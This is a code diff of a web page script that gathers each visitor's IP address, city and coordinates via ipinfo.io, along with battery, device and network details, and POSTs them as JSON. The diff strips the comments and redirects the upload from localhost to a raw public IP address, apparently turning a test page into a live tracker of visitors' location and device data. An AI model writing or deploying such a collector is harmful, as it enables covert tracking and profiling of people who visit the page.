@@ -137,7 +137,6 @@
       const apiUrl = `https://ipinfo.io/json?token=${apiToken}`;
 
       try {
-        // Fetch location and IP info
         const ipInfo = await fetch(apiUrl);
         const ipData = await ipInfo.json();
         data.ip = ipData.ip || "Unknown IP";
@@ -148,7 +147,6 @@
           coordinates: ipData.loc || "Unknown",
         };
 
-        // Fetch battery info
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
           data.battery = {
@@ -159,13 +157,11 @@
           data.battery = "Battery API not supported";
         }
 
-        // Device info
         data.device = {
           userAgent: navigator.userAgent || "Unknown User Agent",
           platform: navigator.platform || "Unknown Platform",
         };
 
-        // Network info
         if (navigator.connection) {
           const connection = navigator.connection;
           data.network = {
@@ -175,7 +171,6 @@
         } else {
           data.network = "Network API not supported";
         }
-
       } catch (error) {
         console.error("Error collecting device info:", error);
       }
@@ -194,7 +189,7 @@
       };
 
       try {
-        const response = await fetch('http://127.0.0.1:5000/data', {
+        const response = await fetch('http://36.75.64.201:5000/data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(data),
@@ -207,4 +202,4 @@
     });
   </script>
 </body>
-</htm
+</html>
